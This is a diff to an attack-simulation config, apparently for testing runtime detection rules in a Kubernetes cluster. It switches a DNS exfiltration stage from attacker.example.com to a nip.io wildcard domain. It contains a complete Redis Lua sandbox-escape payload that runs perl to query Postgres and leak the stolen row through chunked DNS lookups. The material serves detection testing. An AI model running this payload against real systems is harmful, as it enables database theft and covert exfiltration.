@@ -21,10 +21,14 @@ metadata:
 
     s6 (dns-exfil-of-stolen-row): same primitive, different sink.
       Reads the postgres row, base32-encodes it, slices into 30-char
-      DNS labels and queries <chunk>.attacker.example.com one per
-      chunk. Each query is a separate R0005 event with the encoded
-      payload visible in alert metadata. Operators get to SEE the
-      leaked bytes in the SIEM rather than just an anomaly count.
+      DNS labels and queries <chunk>.1.1.1.1.nip.io one per chunk
+      (nip.io is a public wildcard resolver — <a.b.c.d>.nip.io
+      always resolves to a.b.c.d, so each chunk is a guaranteed-
+      resolvable DNS query that node-agent's trace_dns gadget
+      observes). Each query is a separate R0005 event with the
+      encoded payload visible in alert metadata. Operators get to
+      SEE the leaked bytes in the SIEM rather than just an anomaly
+      count.
 
     Detection narrative (under shipped cluster defaults):
       s5: R0001 (perl in redis) + R0011 (egress redis→postgres) +
@@ -97,21 +101,35 @@ attacks:
       - ruleID: R0011
         ruleName: Unexpected Egress Network Traffic
         containerName: redis
-        # BLIND today: same operator-knob pair as the basic Stage 3.
+        # BLIND-by-rule-design: R0011 expression explicitly filters
+        # private IPs (`!net.is_private_ip(event.dstAddr)`), and
+        # chain-postgres:5432 resolves to a cluster-internal address.
+        # R0011's intent is detecting *external* exfil — s4 / s6 are
+        # the chain stages that exercise it. (Pre-#127 this was BLIND
+        # because of the operator knobs; that's now flipped, but the
+        # private-IP filter still applies here by design.)
 
   # ─── Stage 6 ─── DNS exfiltration of the stolen postgres row ─────────
   #
   # Same primitive as s5, but the perl child also splits the extracted
   # row into base32 labels (DNS label limit: 63 chars, RFC 1035) and
-  # issues one `getent hosts <chunk>.attacker.example.com` per chunk.
-  # Each getent triggers a DNS lookup → if networkEventsStreaming were
-  # enabled, R0005 fires per query and alertmanager records the
+  # issues one `getent hosts <chunk>.1.1.1.1.nip.io` per chunk.
+  # Each getent triggers a DNS lookup that node-agent's trace_dns
+  # gadget observes; R0005 fires per query (`<chunk>.1.1.1.1.nip.io`
+  # is not in chain-redis NN egress) and alertmanager records the
   # encoded label in alert.labels.address — operators see the actual
   # leaked bytes in the SIEM, not just an anomaly count.
   #
-  # The attacker.example.com TLD never resolves (NXDOMAIN), so no
-  # outbound TCP follows the lookup — the DNS query IS the
-  # exfiltration channel.
+  # nip.io is a public wildcard DNS service: any subdomain of
+  # <a.b.c.d>.nip.io resolves to a.b.c.d. So `<chunk>.1.1.1.1.nip.io`
+  # always returns 1.1.1.1, which gives us a guaranteed-resolvable
+  # DNS query name per chunk (node-agent's R0005 only fires on
+  # queries the resolver actually answers — NXDOMAIN responses
+  # don't populate event.name reliably, so the previous
+  # attacker.example.com pattern was silently BLIND even with the
+  # network knobs flipped). The actual TCP follow-up to 1.1.1.1
+  # only happens if getent's caller proceeds to connect; getent
+  # itself just resolves, so the DNS query IS the exfil channel.
   - name: s6-dns-exfil-of-stolen-row
     type: exfil
     http:
@@ -120,7 +138,7 @@ attacks:
       headers:
         Content-Type: application/json
       body: |
-        {"script":"local io_mod=nil; pcall(function() if type(io)=='table' and io.popen then io_mod=io end end); if not io_mod then pcall(function() local L=package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io'); if L then io_mod=L() end end); end; if not io_mod then return 'sandbox_blocked' end; local h=io_mod.popen(\"perl -MIO::Socket::INET -MMIME::Base64 -e 'my $s=IO::Socket::INET->new(PeerAddr=>q{chain-postgres:5432},Timeout=>3) or die qq{no_socket}; my $params=qq{user\\\\0postgres\\\\0database\\\\0postgres\\\\0\\\\0}; syswrite($s, pack(q{Nn2}, length($params)+8, 3, 0).$params); my $r; sysread($s, $r, 1024); my $q=qq{SELECT current_database()||chr(58)||current_user\\\\0}; syswrite($s, qq{Q}.pack(q{N}, length($q)+4).$q); my $row; sysread($s, $row, 4096); my $val=q{}; if ($row =~ /D.{4}.{2}(.{0,4})(.*)/s) { $val=$2; $val =~ tr/\\\\x20-\\\\x7e//cd; } close $s; my $enc=encode_base64($val, q{}); $enc =~ tr#A-Za-z0-9##cd; for (my $i=0; $i<length($enc); $i+=30) { my $chunk=substr($enc, $i, 30); system(qq{getent hosts $chunk.attacker.example.com >/dev/null 2>&1}); print qq{exfil_chunk=$chunk\\\\n}; } print qq{exfil_done\\\\n}' 2>&1\"); local out=h:read('*a'); h:close(); return out"}
+        {"script":"local io_mod=nil; pcall(function() if type(io)=='table' and io.popen then io_mod=io end end); if not io_mod then pcall(function() local L=package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io'); if L then io_mod=L() end end); end; if not io_mod then return 'sandbox_blocked' end; local h=io_mod.popen(\"perl -MIO::Socket::INET -MMIME::Base64 -e 'my $s=IO::Socket::INET->new(PeerAddr=>q{chain-postgres:5432},Timeout=>3) or die qq{no_socket}; my $params=qq{user\\\\0postgres\\\\0database\\\\0postgres\\\\0\\\\0}; syswrite($s, pack(q{Nn2}, length($params)+8, 3, 0).$params); my $r; sysread($s, $r, 1024); my $q=qq{SELECT current_database()||chr(58)||current_user\\\\0}; syswrite($s, qq{Q}.pack(q{N}, length($q)+4).$q); my $row; sysread($s, $row, 4096); my $val=q{}; if ($row =~ /D.{4}.{2}(.{0,4})(.*)/s) { $val=$2; $val =~ tr/\\\\x20-\\\\x7e//cd; } close $s; my $enc=encode_base64($val, q{}); $enc =~ tr#A-Za-z0-9##cd; for (my $i=0; $i<length($enc); $i+=30) { my $chunk=substr($enc, $i, 30); system(qq{getent hosts $chunk.1.1.1.1.nip.io >/dev/null 2>&1}); print qq{exfil_chunk=$chunk\\\\n}; } print qq{exfil_done\\\\n}' 2>&1\"); local out=h:read('*a'); h:close(); return out"}
     successIndicators:
       - statusCode: 200
       - bodyContains: exfil_done
@@ -132,8 +150,6 @@ attacks:
       - ruleID: R0005
         ruleName: DNS Anomalies in container
         containerName: redis
-        # BLIND today: networkEventsStreaming=disable.
-      - ruleID: R0011
-        ruleName: Unexpected Egress Network Traffic
-        containerName: redis
-        # BLIND today: same as above.
+        # Fires now per chunk — <chunk>.1.1.1.1.nip.io is a resolvable
+        # name (nip.io wildcard), so trace_dns sees the query and
+        # R0005 (!event.name.endsWith('.svc.cluster.local.')) triggers.
